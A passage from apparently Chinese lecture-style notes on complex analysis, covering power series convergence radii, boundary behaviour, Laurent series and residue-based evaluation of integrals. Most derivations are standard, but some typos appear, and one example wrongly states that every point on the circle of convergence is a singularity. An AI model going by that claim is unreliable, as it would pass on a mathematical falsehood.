- 1}(z).$$</p><p>重复可得 $$P_n(z) = C_n\prod_{k = 0}^{n}(z - z_k).$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>设 $\forall z\in\mathbb{C}$, 有 $P_n(z)\ne 0$.</p><p>令 $g(z) = \cfrac{1}{P_n(z)}$, 则 $$g’(z) = -\cfrac{P’_n(z)}{P_n^2(z)}$$</p><p>处处存在, 那么 $g(z)$ 在 $\mathbb{C}$ 内解析. 由于<br>$$P_n(z)\rightarrow\infty, \mbox{当}r\rightarrow\infty,$$</p><p>故 $$g(z)\rightarrow 0, \mbox{当}r\rightarrow\infty,$$</p><p>即 $g(z)$ 有界.</p><p>由 $Liouville$ 定理, 得 $g(z)$ 为常数, 进而 $P_n(z)$ 为常数.</p><p>这与 $C_n\ne 0$ 矛盾. 以下同 $\textit{Proof 1}$.&nbsp;◻</p><h3 id="9-幂级数的收敛半径"><a href="#9-幂级数的收敛半径" class="headerlink" title="9. 幂级数的收敛半径"></a>9. 幂级数的收敛半径</h3><p>$\textbf{Example:}$<br>对幂级数 $f(z) = \sum_{k = 0}^{\infty}\limits c_kz^k$, 若存在<br>$R &gt; 0$, 使得</p><p>当 $\left|{z}\right| &gt; R$ 时 $f(z)$ 发散, 当 $\left|{z}\right| &lt; R$ 时<br>$f(z)$ 绝对收敛,</p><p>那么称 $R$ 为 $f(z)$ 的收敛半径.&nbsp;◻</p><p>$\textbf{Example:}$<br>$\textbf{(Abel定理)}$ 对幂级数<br>$f(z) = \sum_{k = 0}^{\infty}\limits c_kz^k$, 若</p><p>$f(z)$ 在 $z = z_1\ne 0$ 处收敛, 则在<br>$\left|{z}\right| &lt; \left|{z_1}\right|$ 绝对收敛;</p><p>$f(z)$ 在 $z = z_2\ne 0$ 处发散, 则在<br>$\left|{z}\right| &gt; \left|{z_2}\right|$ 发散.&nbsp;◻</p><p>$\textbf{Example:}$<br>若幂级数 $f(z) = \sum_{k = 0}^{\infty}\limits c_kz^k$ 在 $z_0$<br>处条件收敛, 则收敛半径 $R = \left|{z_0}\right|$.&nbsp;◻</p><p>$\textbf{Solution:}$<br>由收敛半径的定义:</p><p>若 $\left|{z_o}\right| &gt; R$ $\Longrightarrow$ $f(z_0)$ 发散, 与题设矛盾,<br>故 $f(z_0)$ 收敛, $\left|{z_0}\right|\le R$.</p><p>若 $\left|{z_0}\right| &lt; R$ $\Longrightarrow$ $f(z_0)$ 绝对收敛,<br>与题设矛盾, 故 $\left|{z_0}\right|\ge R$.</p><p>综上, 得 $\left|{z_0}\right| = R$.&nbsp;◻</p><p>$\textbf{Example:}$<br>对幂级数<br>$$f(z) = \sum_{k = 0}^{\infty}\limits c_kz^k, g(z) = \sum_{k = 0}^{\infty}\limits d_kz^k$$</p><p>当 $n$ 充分大时, 有 $\left|{d_n}\right| \le \left|{c_n}\right|$,<br>则收敛半径 $R_1\le R_2$.&nbsp;◻</p><p>$\textbf{Example:}$<br>若 $c_n = a_n + ib_n, a_n, b_n\in\mathbb{R}$, 对幂级数<br>$$f(z) = \sum_{n = 0}^{\infty}\limits c_nz^n = \sum_{n = 0}^{\infty}\limits a_nz^n + i\sum_{n = 0}^{\infty}\limits b_nz^n$$</p><p>其中<br>$\sum_{n = 0}^{\infty}\limits a_nz^n, \sum_{n = 0}^{\infty}\limits b_nz^n$<br>的收敛半径分别为 $R_1, R_2$, 那么 $\sum_{n = 0}^{\infty}\limits c_nz^n$<br>的收敛半径 $R = \min\left{R_1, R_2\right}$.&nbsp;◻</p><p>$\textbf{Solution:}$<br>不妨设 $R_1\le R_2$, 此时 $\min\left{R_1, R_2\right} = R_1$.</p><p>下证 $R = R_1$. 先证 $R_1\ge R$.</p><p>由 $c_n = a_n + ib_n$, 有 $\left|{c_n}\right| \ge \left|{a_n}\right|$,<br>进而<br>$$\sum_{n = 0}^{\infty}\limits \left|{c_nz^n}\right| \ge \sum_{n = 0}^{\infty}\limits \left|{a_nz^n}\right|.$$</p><p>那么当 $\left|{z}\right| &lt; R$ 时, 由收敛半径定义,<br>$$\sum_{n = 0}^{\infty}\limits \left|{c_nz^n}\right| \ge \sum_{n = 0}^{\infty}\limits \left|{a_nz^n}\right| &lt; \infty.$$</p><p>此时 $\sum_{n = 0}^{\infty}\limits a_nz^n$ 绝对收敛, 那么 $R_1 \ge R$.</p><p>再证 $R_1\le R$.</p><p>若 $R_1 &gt; R$, 取<br>$z = \cfrac{1}{2}\left(R + R_1\right)\in\left(R, R_1\right)$ 由<br>$$\sum_{n = 0}^{\infty}\limits c_nz^n = \sum_{n = 0}^{\infty}\limits a_nz^n + i\sum_{n = 0}^{\infty}\limits b_nz^n$$</p><p>那么此时 $\sum_{n = 0}^{\infty}\limits a_nz^n$,<br>$\sum_{n = 0}^{\infty}\limits b_nz^n$ 均收敛,</p><p>进而 $\sum_{n = 0}^{\infty}\limits c_nz^n$ 收敛, 且 $z &gt; R$,<br>与收敛半径定义矛盾. 故 $R_1\le R$.</p><p>综上, 有 $R = \min\left{R_1, R_2\right}$ 成立.&nbsp;◻</p><p>$\textbf{Example:}$<br>若 $f(z)$ 在 $R$ 上无奇点, 则收敛半径 $R = +\infty$;</p><p>若 $f(z)$ 在 $R$ 上有奇点 $z_1, z_2, \cdots, z_n$, 则收敛半径<br>$R = \min_{1\le k\le n}\limits \left|{z_k}\right|$.&nbsp;◻</p><h3 id="10-幂级数的敛散性"><a href="#10-幂级数的敛散性" class="headerlink" title="10. 幂级数的敛散性"></a>10. 幂级数的敛散性</h3><p>$\textbf{Example:}$<br>$$f_1(z) = \sum_{n = 1}^{\infty}\limits z^n$$</p><p>在收敛圆周上处处发散.&nbsp;◻</p><p>$\textbf{Solution:}$<br>收敛半径 $R = 1$. 当 $\left|{z}\right| = 1$ 时,<br>$z = e^{i\theta}\thinspace(\theta\in\left[0, 2\pi\right))$,</p><p>那么<br>$$\left|{z^n}\right| = \left|{e^{in\theta}}\right| = 1\nrightarrow 0, \mbox{当}\thinspace n\rightarrow \infty.$$</p><p>由 $Cauchy$ 收敛准则, $$f_1(z) = \sum_{n = 1}^{\infty}\limits z^n$$</p><p>在收敛圆周上处处发散.&nbsp;◻</p><p>$\textbf{Example:}$<br>$$f_2(z) = \sum_{n = 1}^{\infty}\limits \frac{z^n}{n}$$</p><p>在收敛圆周上部分发散, 部分收敛.&nbsp;◻</p><p>$\textbf{Solution:}$<br>注意到<br>$$f_2(z) = \sum_{n = 1}^{\infty}\limits\int_{0}^{z} t^{n - 1}dt = \int_{0}^{z}\sum_{n = 1}^{\infty}\limits t^{n - 1}dt = -\ln(1 - z), \left|{z}\right| &lt; 1 = R.$$</p><p>且 $f_2(1) = \sum_{n = 1}^{\infty}\limits\cfrac{1}{n}$ 发散,<br>$f_2(-1) = \sum_{n = 1}^{\infty}\limits\cfrac{(-1)^n}{n} = -\ln2$ 收敛.</p><p>那么 $$f_2(z) = \sum_{n = 1}^{\infty}\limits\frac{z^n}{n}$$</p><p>在收敛圆周上部分发散, 部分收敛.&nbsp;◻</p><p>$\textbf{Example:}$<br>给出<br>$$\sum_{n = 1}^{\infty}\limits\frac{\cos{n\theta}}{n}, \sum_{n = 1}^{\infty}\limits\frac{\sin{n\theta}}{n}$$</p><p>的和函数, 其中 $\theta\in\left(0, 2\pi\right)$.&nbsp;◻</p><p>$\textbf{Solution:}$<br>注意到对于<br>$z = x + iy\in\mathbb{C}, \mbox{其中}\thinspace x, y\in\mathbb{R}$, 有<br>$$\ln(x + iy) = \ln\left|{x + iy}\right| + i\theta = \frac{1}{2}\ln(x^2 + y^2) + i\arctan\frac{y}{x}.$$</p><p>对于 $z = re^{i\theta}, 0\le r &lt; 1, 0\le\theta &lt; 2\pi$, 有<br>$$\sum_{n = 1}^{\infty}\limits\frac{r^ne^{in\theta}}{n} = -\ln(1-re^{i\theta}) = -\ln(1-r\cos\theta - i\sin\theta),$$</p><p>展开得<br>$$\sum_{n = 1}^{\infty}\limits\frac{r^n\cos{n\theta}}{n} + i\sum_{n = 1}^{\infty}\limits\frac{r^n\sin{n\theta}}{n} = -\frac{1}{2}\ln(1 - 2r\cos\theta + r^2) + i\arctan\frac{r\sin\theta}{1 - r\cos\theta}.$$</p><p>当 $\theta\in\left(0, 2\pi\right)$ 时, 令 $r\rightarrow 1^{-}$, 即得<br>$$\sum_{n = 1}^{\infty}\limits\frac{\cos{n\theta}}{n} = -\frac{1}{2}\ln(2 - 2\cos\theta) = -\ln\left(2\sin\frac{\theta}{2}\right),$$<br>$$\sum_{n = 1}^{\infty}\limits\frac{\sin{n\theta}}{n} = \arctan\frac{\sin\theta}{1 - \cos\theta} = \arctan\left(\cot\frac{\theta}{2}\right) = \frac{\pi - \theta}{2}.$$&nbsp;◻</p><p>$\textbf{Example:}$<br>给出<br>$$\sum_{n = 1}^{\infty}\limits\frac{\cos{n\theta}}{n^2}, \sum_{n = 1}^{\infty}\limits\frac{\sin{n\theta}}{n^2}$$</p><p>的和函数, 其中 $\theta\in\left[0, 2\pi\right)$.&nbsp;◻</p><p>$\textbf{Solution:}$<br>注意到<br>$$\sum_{n = 1}^{\infty}\limits\frac{\cos{n\theta}}{n^2} = \sum_{n = 1}^{\infty}\frac{1}{n^2} - \sum_{n = 1}^{\infty}\limits\int_{0}^{\theta}\frac{\sin{nt}}{n}dt = \frac{\pi^2}{6} - \frac{\theta\left(2\pi - \theta\right)}{4}.$$<br>$$\sum_{n = 1}^{\infty}\limits\frac{\sin{n\theta}}{n^2} = \sum_{n = 1}^{\infty}\limits\int_{0}^{\theta}\frac{\cos{nt}}{n}dt = \int_{0}^{\theta}\sum_{n = 1}^{\infty}\limits\frac{\cos{nt}}{n}dt = -\int_{0}^{\theta}\ln\left(2\sin\frac{t}{2}\right)dt.$$&nbsp;◻</p><p>$\textbf{Example:}$<br>$$f_3(z) = \sum_{n = 1}^{\infty}\limits \frac{z^n}{n^2}$$</p><p>在收敛圆周上处处收敛.&nbsp;◻</p><p>$\textbf{Solution:}$<br>注意到当 $\left|{z}\right| = 1$ 时,<br>$$\sum_{n = 1}^{\infty}\left|{\frac{z^n}{n^2}}\right| = \sum_{n = 1}^{\infty}\frac{1}{n^2} = \frac{\pi^2}{6},$$</p><p>那么 $$f_3(z) = \sum_{n = 1}^{\infty}\limits \frac{z^n}{n^2}$$</p><p>在收敛圆周上处处收敛.&nbsp;◻</p><p>$\textbf{Example:}$<br>幂级数收敛圆周上的点都是其奇点.&nbsp;◻</p><h3 id="11-Laurent-级数"><a href="#11-Laurent-级数" class="headerlink" title="11. Laurent 级数"></a>11. Laurent 级数</h3><p>$\textbf{Example:}$<br>$\mathbb{C}^2$ 上的分片函数: $$f(z) = \cfrac{1}{1 + z^2} =<br>        \begin{cases}<br>            \sum_{n = 0}^{\infty}\limits(-1)^nz^{2n}, \left|{z}\right| &lt; 1 \<br>            \cfrac{1}{1 + z^2}, \left|{z}\right| = 1, z\ne\pm i \<br>            \sum_{n = 0}^{\infty}\limits\cfrac{(-1)^n}{z^{2(n + 1)}}, \left|{z}\right| &gt; 1<br>        \end{cases}$$&nbsp;◻</p><h3 id="12-留数-A"><a href="#12-留数-A" class="headerlink" title="12. 留数 A"></a>12. 留数 A</h3><p>$\textbf{Example:}$<br>求复积分<br>$$I = \oint_{\left|{z}\right| = \varepsilon &gt; 1}e^{\frac{1}{z}}dz.$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>令 $t = \cfrac{1}{z}$, $dz = -\cfrac{dt}{t^2}$. 记<br>$z = \varepsilon e^{i\theta}$, 那么<br>$t = \cfrac{1}{\varepsilon}e^{-i\theta}$,<br>$\theta\in\left[0, 2\pi\right)$.</p><p>那么<br>$$I = -\oint_{\left|{t}\right| = \frac{1}{\varepsilon}}{e^t\left(-\frac{dt}{t^2}\right)} = \oint_{\left|{t}\right| = \frac{1}{\varepsilon}}\frac{e^t}{t^2}dt = 2\pi i\left(e^t\right)’|_{t = 0} = 2\pi i.$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>注意到<br>$$I = \oint_{\left|{z}\right| = \varepsilon}\limits e^{\frac{1}{z}}dz = \sum_{n = 0}^{+\infty}\cfrac{1}{n!}\oint_{\left|{z}\right| = \varepsilon}\cfrac{dz}{z^n} = \sum_{n = 0}^{+\infty}\limits\cfrac{1}{n!}I_n = I_1 = 2\pi i.$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求复积分<br>$$J_n = \oint_{\left|{z}\right| = r &gt; 1}\cfrac{dz}{1 + z^n}, n\in\mathbb{N}.$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>令 $t = \cfrac{1}{z}$, $dz = -\cfrac{dt}{t^2}$. 那么<br>$$\begin{aligned}<br>            J_n &amp;= -\oint_{\left|{t}\right| = \frac{1}{r}}\cfrac{1}{1 + \frac{1}{t^n}}\left(-\frac{dt}{t^2}\right) \<br>            &amp;= \oint_{\left|{t}\right| = \frac{1}{r}}\cfrac{t^{n - 2}}{1 + t^n}dt \<br>            &amp;= \begin{cases}<br>                2\pi i, n = 1; \<br>                0, n\ge 2.<br>            \end{cases}<br>        \end{aligned}$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>$$\begin{aligned}<br>            J_n &amp;= 2\pi i\sum_{k = 1}^{n}\limits Res\left[\frac{1}{1 + z^n}, z_k\right] \<br>            &amp;= 2\pi i\sum_{k = 1}^{n}\limits\cfrac{1}{nz_k^{n - 1}} \<br>            &amp;= \cfrac{2\pi i}{n}\sum_{k = 1}^{n}(-z_k) \<br>            &amp;= -\cfrac{2\pi i}{n}\sum_{k = 1}^{n}z_k \<br>            &amp;= \begin{cases}<br>                2\pi i, n = 1; \<br>                0, n\ge 2.<br>            \end{cases}<br>        \end{aligned}$$&nbsp;◻</p><p>$\textbf{Example:}$<br>给出<br>$$K_n = \oint_{\left|{z}\right| = r &gt; 1}\cfrac{z^{2n}dz}{1 + z^n} = \oint_{\left|{z}\right| = r}\cfrac{dz}{1 + z^n} + \oint_{\left|{z}\right| = r}(z^n - 1) = J_n, n\in\mathbb{N}.$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求复积分<br>$$J = \oint_{\left|{z}\right| = r &gt; 1}\frac{z^3e^{\frac{1}{z}}}{1 + z}dz.$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>令 $t = \cfrac{1}{z}$, $dz = -\cfrac{dt}{t^2}$. 从而<br>$$J = \oint_{\left|{t}\right| = \frac{1}{r}}\frac{e^t}{t^4(1 + t)}dt = \cfrac{2\pi i}{3!}\left(\frac{e^t}{1 + t}\right)^{(3)}|_{t = 0} = -\frac{2}{3}\pi i.$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>令 $t = \cfrac{1}{z}$, $dz = -\cfrac{dt}{t^2}$. 从而<br>$$\begin{aligned}<br>            J &amp;= \oint_{\left|{t}\right| = \frac{1}{r}}\frac{e^t}{t^4(1 + t)}dt \<br>            &amp;= \oint_{\left|{t}\right| = \frac{1}{r}}\frac{e^t(1 - t^4 + t^4)}{t^4(1 + t)}dt \<br>            &amp;= \oint_{\left|{t}\right| = \frac{1}{r}}\frac{e^t(1 - t^4)}{t^4(1 + t)}dt + \oint_{\left|{t}\right| = \frac{1}{r}}\frac{e^tt^4}{1 + t}dt \<br>            &amp;= \oint\frac{e^t}{t^4}dt - \oint\frac{e^t}{t^3}dt + \oint\frac{e^t}{t^2}dt - \oint\frac{e^t}{t}dt \<br>            &amp;= 2\pi i\left(\frac{1}{3!} - \frac{1}{2!} + \frac{1}{1!} - \frac{1}{0!}\right) \<br>            &amp;= -\frac{2}{3}\pi i.<br>        \end{aligned}$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>令 $t = \cfrac{1}{z}$, $dz = -\cfrac{dt}{t^2}$. 从而<br>$$J = \oint_{\left|{t}\right| = \frac{1}{r}}\frac{e^t}{t^4(1 + t)}dt,$$</p><p>注意到 $$\begin{aligned}<br>            \frac{e^t}{t^4(1 + t)} &amp;= \frac{1}{t^4}\left(1 + t + \frac{t^2}{2!} + \frac{t^3}{3!} + \cdots\right)\left(1 - t + t^2 - t^3 + \cdots\right) \<br>            &amp;= \frac{1}{t^4}\left(1 + \frac{1}{2}t^2 - \frac{1}{3}t^3 + O(t^3)\right),<br>        \end{aligned}$$</p><p>故 $$\begin{aligned}<br>            J &amp;= \oint_{\left|{t}\right| = \frac{1}{r}}\frac{1}{t^4}\left(1 + \frac{1}{2}t^2 - \frac{1}{3}t^3 + O(t^3)\right) \<br>            &amp;= I_4 + \frac{1}{2}I_2 - \frac{1}{3}I_1 \<br>            &amp;= -\frac{1}{3}I_1 \<br>            &amp;= -\frac{2}{3}\pi i.<br>        \end{aligned}$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>$$\begin{aligned}<br>            J &amp;= \oint_{\left|{z}\right| = r &gt; 1}\frac{z^3e^{\frac{1}{z}}}{1 + z}dz \<br>            &amp;= 2\pi i\left{Res\left[f, 0\right] + Res\left[f, -1\right]\right}.<br>        \end{aligned}$$</p><p>注意到 $$\begin{aligned}<br>            Res\left[f, -1\right] = \frac{(-1)^3e^{-1}}{1} = -e^{-1},<br>        \end{aligned}$$</p><p>而 $Res\left[f, 0\right]$ 为 $f$ 在 $z_0 = 0$ 处 $Larent$ 级数中的系数<br>$C_{-1}$.</p><p>注意到 $$\begin{aligned}<br>            \frac{z^3e^{\frac{1}{z}}}{1 + z} = z^3\left(1 + \frac{1}{z} + \frac{1}{2!z^2} + \frac{1}{3!z^3} + \cdots\right)\left(1 - z + z^2 - z^3 + \cdots\right),<br>        \end{aligned}$$</p><p>那么<br>$$C_{-1} = \frac{1}{4!} - \frac{1}{5!} + \frac{1}{6!} - \frac{1}{7!} + \cdots = e^{-1} - \frac{1}{3}.$$</p><p>进而 $$\begin{aligned}<br>            J &amp;= \oint_{\left|{z}\right| = r &gt; 1}\frac{z^3e^{\frac{1}{z}}}{1 + z}dz \<br>            &amp;= 2\pi i\left{Res\left[f, 0\right] + Res\left[f, -1\right]\right} \<br>            &amp;= 2\pi i\left(-e^{-1} + e^{-1} - \frac{1}{3}\right) \<br>            &amp;= -\frac{2}{3}\pi i.<br>        \end{aligned}$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求复积分<br>$$I_{a, b} = \int_{0}^{2\pi}\cfrac{d\theta}{a + b\cos\theta},$$</p><p>其中 $a &gt; \left|{b}\right|$, $a, b\in\mathbb{R}$.&nbsp;◻</p><p>$\textbf{Solution:}$<br>令<br>$$z = e^{i\theta}\Longrightarrow \cos\theta = \cfrac{z + z^{-1}}{2}.$$</p><p>那么<br>$$dz = ie^{i\theta}d\theta = izd\theta\Longrightarrow d\theta = \cfrac{dz}{iz}.$$</p><p>进而<br>$$I_{a, b} = \int_{0}^{2\pi}\cfrac{d\theta}{a + b\frac{z + z^{-1}}{2}} = \cfrac{2}{i}\oint_{\left|{z}\right| = 1}\cfrac{dz}{bz^2 + 2az + b}.$$</p><p>$\circ$ 若 $b = 0$, 得 $$I_{a, b} = \frac{2\pi}{a}.$$</p><p>$\circ$ 若 $b &gt; 0$, 考虑方程 $z^2 + 2\cfrac{a}{b}z + 1 = 0$. 解得<br>$$\begin{aligned}<br>            \begin{cases}<br>                z_1 = -\cfrac{a}{b} + \cfrac{\sqrt{a^2 - b^2}}{b},\<br>                z_2 = -\cfrac{a}{b} - \cfrac{\sqrt{a^2 - b^2}}{b} &lt; -\cfrac{a}{b} &lt; -1.<br>            \end{cases}<br>        \end{aligned}$$</p><p>故<br>$$I_{a, b} = \cfrac{2}{i}\cdot 2\pi i\cdot Res\left[f(z), z_1\right] = \cfrac{2}{i}\cdot 2\pi i\cdot\cfrac{1}{2bz_1 + 2a} = \cfrac{2\pi}{\sqrt{a^2 - b^2}}.$$</p><p>$\circ$ 若 $b &lt; 0$, 同理有<br>$$I_{a, b} = \cfrac{2\pi}{\sqrt{a^2 - b^2}}.$$</p><p>综上, 有<br>$$I_{a, b} = \int_{0}^{2\pi}\cfrac{d\theta}{a + b\cos\theta} = \cfrac{2\pi}{\sqrt{a^2 - b^2}}.$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求复积分<br>$$I_p = \int_{0}^{2\pi}\cfrac{d\theta}{1 + p^2 - 2p\cos\theta},$$</p><p>其中 $p\in(-1, 1).$&nbsp;◻</p><p>$\textbf{Solution:}$<br>在 $I_{a, b}$ 中取 $a = 1 + p^2$, $b = -2p$, 得<br>$$I_p = \cfrac{2\pi}{\sqrt{(1 + p^2)^2 - (-2p)^2}} = \cfrac{2\pi}{1 - p^2}.$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求复积分<br>$$J_{a, b} = \int_{0}^{2\pi}\cfrac{d\theta}{a^2\cos^2\theta + b^2\sin^2\theta},$$</p><p>其中 $a &gt; 0$, $b &gt; 0$.&nbsp;◻</p><p>$\textbf{Solution:}$</p><p>$$J_{a, b} = \int_{0}^{2\pi}\cfrac{2d\theta}{(a^2 + b^2) + (a^2 - b^2)\cos 2\theta} = \int_{0}^{4\pi}\cfrac{dt}{(a^2 + b^2) + (a^2 - b^2)\cos t},$$</p><p>在 $I_{A, B}$ 中取 $A = a^2 + b^2$, $B = a^2 - b^2$, 得<br>$$J_{a, b} = 2\cfrac{2\pi}{\sqrt{(a^2 + b^2)^2 - (a^2 - b^2)^2}} = \cfrac{2\pi}{ab}.$$&nbsp;◻</p><h3 id="13-留数-B"><a href="#13-留数-B" class="headerlink" title="13. 留数 B"></a>13. 留数 B</h3><p>$\textbf{Example:}$<br>$C_R: Re^{i\theta}$, $0\le\theta\le\pi$, 多项式 $P$, $Q$ 满足<br>$\deg Q\ge\deg P + 2$, 则<br>$$\lim_{R\rightarrow +\infty}\limits\int_{C_R}\frac{P(z)}{Q(z)}dz = 0.$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求积分<br>$$I_{a, b} = \int_{0}^{+\infty}\cfrac{dx}{(x^2 + a^2)(x^2 + b^2)},$$</p><p>其中 $a &gt; 0$, $b &gt; 0$ 为常数.&nbsp;◻</p><p>$\textbf{Solution:}$<br>注意到<br>$$I_{a, b} = \frac{1}{2}\lim_{R\rightarrow +\infty}\int_{-R}^{R}\cfrac{dx}{(x^2 + a^2)(x^2 + b^2)}.$$</p><p>作 $\Gamma_R: \left[-R, R\right]\cup C_R$,</p><p>那么根据复合闭路定理, 得<br>$$\oint_{\Gamma_R}f(z)dz = \int_{-R}^{R}f(x)dx + \int_{C_R}f(z)dz.$$</p><p>令 $R\rightarrow +\infty$, 由于<br>$$\lim_{R\rightarrow +\infty}\int_{C_R}f(z)dz = 0,$$</p><p>那么 $$\begin{aligned}<br>            I_{a, b} &amp;= \frac{1}{2}\lim_{R\rightarrow +\infty}\oint_{\Gamma_R}f(z)dz \<br>            &amp;= \pi i\left(Res\left[f(z), ai\right], Res\left[f(z), bi\right]\right) \<br>            &amp;= \pi i\left(\frac{1}{2ai(a^2 + b^2 +2(ai)^2)} + \frac{1}{2bi(a^2 + b^2 +2(bi)^2)}\right) \<br>            &amp;= \frac{\pi}{2ab(a + b)}.<br>        \end{aligned}$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求复积分 $$I_n = \int_{0}^{+\infty}\cfrac{dx}{1 + x^{2n}}.$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>注意到<br>$$I_n = \frac{1}{2}\lim_{R\rightarrow +\infty}\int_{-R}^{R}\cfrac{dx}{1 + x^{2n}}.$$</p><p>作 $\Gamma_R: \left[-R, R\right]\cup C_R$,</p><p>那么根据复合闭路定理, 得<br>$$\oint_{\Gamma_R}f(z)dz = \int_{-R}^{R}f(x)dx + \int_{C_R}f(z)dz.$$</p><p>令 $R\rightarrow +\infty$, 由于<br>$$\lim_{R\rightarrow +\infty}\int_{C_R}f(z)dz = 0,$$</p><p>那么 $$\begin{aligned}<br>            I_n &amp;= \frac{1}{2}\lim_{R\rightarrow +\infty}\oint_{\Gamma_R}f(z)dz \<br>            &amp;= \pi i\sum_{k = 1}^{n}Res\left[\frac{1}{1 + z^{2n}}, z_k\right] = \pi i\sum_{k = 1}^{n}\frac{1}{2nz_k^{2n - 1}} \<br>            &amp;= \frac{\pi i}{2n}\sum_{k = 1}^{n}z_k^{2n - 1} = -\frac{\pi i}{2n}\sum_{k = 1}^{n}z_k \<br>            &amp;= -\frac{\pi i}{2n}\sum_{k = 1}^{n}e^{\frac{(2k - 1)\pi i}{2n}} = -\frac{\pi i}{2n}e^{-\frac{\pi i}{2n}}\sum_{k = 1}^{n}e^{\frac{k\pi i}{n}} \<br>            &amp;= -\frac{\pi i}{2n}e^{-\frac{\pi i}{2n}}\frac{2}{1 - e^{\frac{\pi i}{n}}} = \frac{\pi i}{n}\frac{1}{e^{\frac{\pi i}{2n}} - e^{-\frac{\pi i}{2n}}} \<br>            &amp;= \frac{\pi i}{n}\frac{1}{2i\sin\frac{\pi}{2n}} = \frac{\frac{\pi}{2n}}{\sin\frac{\pi}{2n}}.<br>        \end{aligned}$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求复积分<br>$$I_{r, n} = \int_{0}^{+\infty}\cfrac{dx}{r^{2n} + x^{2n}}.$$</p><p>其中 $r &gt; 0$.&nbsp;◻</p><p>$\textbf{Solution:}$<br>$$\begin{aligned}<br>            I_{r, n} &amp;= \cfrac{1}{r^{2n - 1}}\int_{0}^{+\infty}\cfrac{d\left(\frac{x}{r}\right)}{1 + \left(\frac{x}{r}\right)^{2n}} \<br>            &amp;= \cfrac{1}{r^{2n - 1}}I_n \<br>            &amp;= \frac{\frac{\pi}{2n}}{r^{2n - 1}\sin\frac{\pi}{2n}}.<br>        \end{aligned}$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求积分 $$J_n = \int_{0}^{+\infty}\cfrac{dx}{1 + x^n},$$</p><p>其中 $n \ge 2$.&nbsp;◻</p><p>$\textbf{Solution:}$<br>注意到<br>$$J_n = \lim_{R\rightarrow +\infty}\int_{0}^{R}\cfrac{dx}{1 + x^n}.$$</p><p>作<br>$\Gamma_R: \left[0, R\right]\cup C_R\cup \left[Re^{i\theta}, 0\right]$,</p><p>那么根据复合闭路定理, 得<br>$$\oint_{\Gamma_R}f(z)dz = \int_{0}^{R}f(x)dx + \int_{C_R}f(z)dz + \int_{R}^{0}f(xe^{i\theta})d(xe^{i\theta}).$$</p><p>令 $R\rightarrow +\infty$, 由于<br>$$\lim_{R\rightarrow +\infty}\int_{C_R}f(z)dz = 0,$$</p><p>取 $\theta = \cfrac{2\pi}{n}, \varphi = \cfrac{\pi}{n}$, 那么<br>$$\begin{aligned}<br>            \lim_{R\rightarrow +\infty}\oint_{\Gamma_R}f(z)dz &amp;= \lim_{R\rightarrow +\infty}\int_{0}^{R}f(x)dx + \lim_{R\rightarrow +\infty}\int_{R}^{0}f(xe^{i\theta})d(xe^{i\theta}) \<br>            &amp;= \lim_{R\rightarrow +\infty}\left(\int_{0}^{R}\cfrac{dx}{1 + x^n}dx - \int_{0}^{R}\cfrac{e^{i\theta}dx}{1 + e^{ni\theta}x^n}\right) \<br>            &amp;= \lim_{R\rightarrow +\infty}\left(\int_{0}^{R}\cfrac{dx}{1 + x^n}dx - e^{\frac{2\pi i}{n}}\int_{0}^{R}\cfrac{dx}{1 + x^n}\right) \<br>            &amp;= \left(1 - e^{\frac{2\pi i}{n}}\right)\lim_{R\rightarrow +\infty}\int_{0}^{R}\cfrac{dx}{1 + x^n}dx \<br>            &amp;= \left(1 - e^{\frac{2\pi i}{n}}\right)J_n.<br>        \end{aligned}$$</p><p>又注意到 $$\begin{aligned}<br>            \lim_{R\rightarrow +\infty}\oint_{\Gamma_R}f(z)dz = 2\pi i\frac{1}{ne^{(n - 1)\frac{\pi i}{n}}},<br>        \end{aligned}$$</p><p>故 $$\begin{aligned}<br>            J_n &amp;= \frac{2\pi i}{ne^{(n - 1)\frac{\pi i}{n}}\left(1 - e^{\frac{2\pi i}{n}}\right)} \<br>            &amp;= \frac{2\pi i}{ne^{(\pi - \varphi)i}\left(1 - e^{2\varphi i}\right)} \<br>            &amp;= \frac{\pi i}{n(-\cos\varphi + i\sin\varphi)\sin\varphi(\sin\varphi - i\cos\varphi)} \<br>            &amp;= \frac{\pi}{n\sin\varphi} = \frac{\frac{\pi}{n}}{\sin\frac{\pi}{n}}.<br>        \end{aligned}$$&nbsp;◻</p><p>$\textbf{Example:}$<br>$$\frac{1}{(1 + z)^n} = \sum_{k = 0}^{+\infty}(-1)^k C_{n + k - 1}^{n - 1}z^k,$$</p><p>其中 $\left|{z}\right| &lt; 1$. 特别地, 其中 $z^{n - 1}$ 项的系数为<br>$$(-1)^{n - 1}C_{2n - 2}^{n - 1} = (-1)^{n - 1}\cfrac{(2n - 2)!}{(n - 1)!(n - 1)!}.$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求积分 $$J_n = \int_{0}^{+\infty}\cfrac{dx}{(1 + x^2)^n}.$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>注意到<br>$$J_n = \frac{1}{2}\lim_{R\rightarrow +\infty}\int_{-R}^{R}\cfrac{dx}{(1 + x^2)^n}.$$</p><p>作 $\Gamma_R: \left[-R, R\right]\cup C_R$,</p><p>那么根据复合闭路定理, 得<br>$$\oint_{\Gamma_R}f(z)dz = \int_{-R}^{R}f(x)dx + \int_{C_R}f(z)dz.$$</p><p>令 $R\rightarrow +\infty$, 由于<br>$$\lim_{R\rightarrow +\infty}\int_{C_R}f(z)dz = 0,$$</p><p>因为 $$\begin{aligned}<br>            \cfrac{1}{(1 + z^2)^n} &amp;= \cfrac{1}{(z + i)^n(z - i)^n} \<br>            &amp;= \cfrac{1}{(2i)^n(1 + \frac{z - i}{2i})^n(z - i)^n} \<br>            &amp;= \cfrac{1}{(2i)^n(z - i)^n}\sum_{k = 